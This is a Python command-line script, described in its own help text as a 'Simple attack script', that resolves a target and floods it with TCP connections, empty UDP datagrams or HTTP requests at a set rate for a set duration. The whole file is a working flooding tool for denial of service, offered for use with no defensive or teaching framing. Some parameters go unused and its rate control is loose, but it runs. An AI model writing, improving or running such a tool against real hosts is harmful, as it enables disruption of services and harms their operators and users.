import asyncio
import aiodns
import aiohttp
import socket
import logging
import argparse

class UdpProtocol(asyncio.DatagramProtocol):
    def connection_made(self, transport):
        pass

    def datagram_received(self, data, addr):
        pass

    def error_received(self, exc):
        logging.error(f"Error received: {exc}")

async def resolve_target(target: str) -> list:
    resolver = aiodns.DNSResolver()
    try:
        response = await resolver.gethostbyname(target, socket.AF_INET)
        return response.addresses
    except aiodns.error.DNSError as e:
        logging.error(f"Error occurred when resolving the domain name {target}: {str(e)}")
        return []

async def send_tcp_request(ip_address: str, port: int, timeout: int):
    try:
        reader, writer = await asyncio.open_connection(ip_address, port)
        logging.info(f"Connected to {ip_address}:{port}")
        writer.close()
        await writer.wait_closed()
    except asyncio.TimeoutError:
        logging.error(f"Failed to connect to {ip_address}:{port} - Timeout")
    except Exception as e:
        logging.error(f"Error occurred when sending TCP request to {ip_address}:{port}: {str(e)}")

async def send_udp_request(ip_address: str, port: int, timeout: int):
    try:
        loop = asyncio.get_running_loop()
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: UdpProtocol(), remote_addr=(ip_address, port))
        transport.sendto(b'')
        await asyncio.sleep(0.1)  # Sleep to allow the datagram to be sent
        transport.close()
    except asyncio.TimeoutError:
        logging.error(f"Request to {ip_address}:{port} timed out")
    except Exception as e:
        logging.error(f"Error occurred when sending UDP request to {ip_address}:{port}: {str(e)}")

async def send_http_request(session, url: str, timeout: int):
    try:
        async with session.get(url, timeout=timeout) as response:
            logging.info(f"HTTP request to {url} returned status code: {response.status}")
    except asyncio.TimeoutError:
        logging.error(f"HTTP request to {url} timed out")
    except Exception as e:
        logging.error(f"Error occurred when sending HTTP request to {url}: {str(e)}")

async def generate_requests(target: str, attack: str, port: int, duration: int, timeout: int, num_requests: int, requests_per_second: int) -> None:
    ip_addresses = await resolve_target(target)

    if not ip_addresses:
        logging.error(f"Could not resolve IP address for target {target}")
        return

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async def send_request(ip_address: str):
            url = f"http://{ip_address}:{port}"
            async with semaphore:
                try:
                    if attack == 'TCP':
                        await send_tcp_request(ip_address, port, timeout)
                    elif attack == 'UDP':
                        await send_udp_request(ip_address, port, timeout)
                    elif attack == 'HTTP':
                        await send_http_request(session, url, timeout)
                except Exception as e:
                    logging.error(f"Error occurred: {str(e)}")

        semaphore = asyncio.Semaphore(requests_per_second)
        await asyncio.gather(*(send_request(ip_address) for ip_address in ip_addresses for _ in range(requests_per_second * duration)))

def start_attack(target: str, attack: str, port: int, duration: int, timeout: int, num_requests: int, requests_per_second: int):
    asyncio.run(generate_requests(target, attack, port, duration, timeout, num_requests, requests_per_second))

def setup_logging():
    logging.basicConfig(level=logging.INFO)

if __name__ == "__main__":
    setup_logging()

    parser = argparse.ArgumentParser(description="Simple attack script")
    parser.add_argument("target", type=str, help="Target domain or IP address")
    parser.add_argument("attack", type=str, help="Attack type (TCP/UDP/HTTP)")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")
    parser.add_argument("timeout", type=int, help="Timeout in seconds")
    parser.add_argument("num_requests", type=int, help="Total number of requests to send")
    parser.add_argument("requests_per_second", type=int, help="Number of requests per second")

    args = parser.parse_args()

    start_attack(args.target, args.attack.upper(), args.port, args.duration, args.timeout, args.num_requests, args.requests_per_second)
